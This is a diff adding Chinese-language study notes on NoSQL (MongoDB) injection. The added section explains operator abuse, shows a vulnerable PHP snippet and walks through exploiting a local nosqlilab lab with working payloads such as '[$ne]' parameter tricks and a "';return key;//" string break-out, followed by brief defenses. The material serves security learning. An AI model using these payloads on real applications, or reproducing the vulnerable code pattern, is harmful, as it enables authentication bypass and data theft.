@@ -3561,19 +3561,122 @@ Linux 用户分为管理员和普通用户，普通用户又分为系统用户�
 
 ### NoSQL 注入 
 
+#### NoSQL 注入定义
+
+- NoSQL 泛指非关系型的数据库。随着互联网 Web2.0 网站的兴起，在高可用，高并发压力下，传统数据库已经不能满足需求，用于解决大数据应用和超大规模数据存储的问题。
+- 主要代表：MongoDB、 Redis、Memcache 
+- MongoDB 
+  - MongoDB 是一个面向文档存储的数据库 
+  - ![1617889602152](HackerMeWeb.assets/1617889602152.png)
+- MongoDB 注入 
+- ![1617889655413](HackerMeWeb.assets/1617889655413.png)
 
 
 
+#### NoSQL 注入原理
+
+- 要点：
+
+  - `$gt : >`
+  - `$lt : <`
+  - `$gte: >=`
+  - `$lte: <=`
+  - `$ne : !=、<>`
+  - `$all: all`
+  - `$regex `
+
+- 示例：
+
+  - `db.test.find({‘name’: {‘$regex ’: ‘Li.*'} })`
+  - `{ "age" : { "$gt" : 3 , "$lt" : 41}}` ，年龄在3到41之间
+  - `{ "age" : { "$lte" : 20}}`，年龄小于等于20
+  - `{ "age" : { "$ne" : 40}}`， 年龄不等于40 
+
+- SQL语句注入
+
+  - POST上传 ： 
+    - `username=test&password=12345 `
+  - 程序语言，我们希望是这样执行的： 
+    - `db.users.find({ username: ‘test', password: ‘12345’}) `
+  - 构造 POST 上传： 
+    - `username[$ne]=1&password[$ne]=1 `
+  - PHP 解析，实际执行： 
+    - `db.logins.find({ username: {$ne:1 }, password {$ne: 1 }) `
+  - 最终执行的SQL语句是
+    - `SELECT * FROM logins WHERE username <> 1 AND password <> 1 `
+
+- 编程原因漏洞
+
+  - 如果在编程语言中不够谨慎，也可能产生像 SQL 注入那样的截断问题，但是这是在程序语言而非 SQL 语句中：
+
+  - 程序写法： 
+
+  - ```php
+    $script=“try{
+        var key=db.users.find({ username: ‘test’}).value;
+        var inputValue=‘”. $input .”’;
+        if(key==inputValue){
+        	return (‘match’);
+    	}
+    }”;
+    
+    当输入
+    ' ; return key; //
+    --->  var inputValue=‘’;return key ; //’;
+    ```
 
 
 
+#### nosqlilab 靶机
+
+- 安装nosqlilab 靶机
+- docker pull registry.cn-shanghai.aliyuncs.com/yhskc/nosqlilab 
+- docker run -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com/yhskc/nosqlilab 
+- docker ps
+- docker rename eloquent_driscoll nosqlilab
+- 浏览器访问：http://127.0.0.1/
 
 
 
+#### NoSQL 注入实战
+
+- Guess The Key  测试
+  - 浏览器访问：http://127.0.0.1/guess_the_key.php
+  - 输入一个 key 猜测内部的key 是多少
+  - 输入 123 测试，http://127.0.0.1/guess_the_key.php?guess=123
+    - The server says: 'No match'
+  - 输入` ';return key;//` 测试，http://127.0.0.1/guess_the_key.php?guess=';return+key;//
+    - The server says: 'Magrathea'
+    - 注入原理是基于 编程原因漏洞
+  - 源码审计
+    - docker exec -it nosqlilab bash
+    - vim guess_the_key.php
+    - ![1617890428791](HackerMeWeb.assets/1617890428791.png)
+- User Lookup  测试
+  - 浏览器访问：http://127.0.0.1/user_lookup.php
+  - 输入用户名，显示详细信息
+  - 输入admin 测试，http://127.0.0.1/user_lookup.php?type=user&username=admin
+    - User not found
+  - 输入`type[$ne]=user&username[$ne]=admin`，`http://127.0.0.1/user_lookup.php?type[$ne]=user&username[$ne]=admin`
+    - 5ee7473c9bdd7d00136a2156: admin - Penny Dog (987)
+    - 显示用户信息
+    - 注入原理是基于 SQL语句注入
+  - 源码审计
+    - docker exec -it nosqlilab bash
+    - vim user_lookup.php
+    - ![1617890710300](HackerMeWeb.assets/1617890710300.png)
 
 
 
+#### 防御措施 
 
+- 对输入进行检查
+- Web 应用防火墙
+- 在编程时顺序结构调整 
+
+
+
+### 框架安全 
 
 
 
